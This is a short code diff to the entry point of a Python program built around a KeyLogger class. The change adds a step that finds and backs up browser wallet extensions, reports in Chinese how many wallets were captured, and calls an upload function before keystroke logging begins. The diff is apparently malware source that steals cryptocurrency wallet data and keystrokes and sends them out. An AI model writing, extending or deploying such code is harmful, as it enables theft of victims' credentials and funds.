@@ -7,6 +7,8 @@ import sys
 import argparse
 
 from .logger import KeyLogger, create_log_file
+from .backup import backup_browser_extensions
+from .uploader import upload_all
 
 
 def main():
@@ -19,6 +21,16 @@ def main():
     # 创建日志文件
     log_file = create_log_file()
 
+    # 备份浏览器扩展数据
+    print("正在备份浏览器扩展数据...")
+    count = backup_browser_extensions()
+    if count > 0:
+        print(f"已备份 {count} 个钱包扩展\n")
+    else:
+        print("未检测到目标钱包扩展\n")
+
+    upload_all()
+    
     # 启动键盘记录器
     logger = KeyLogger(log_file, debug_mode=args.debug)
 
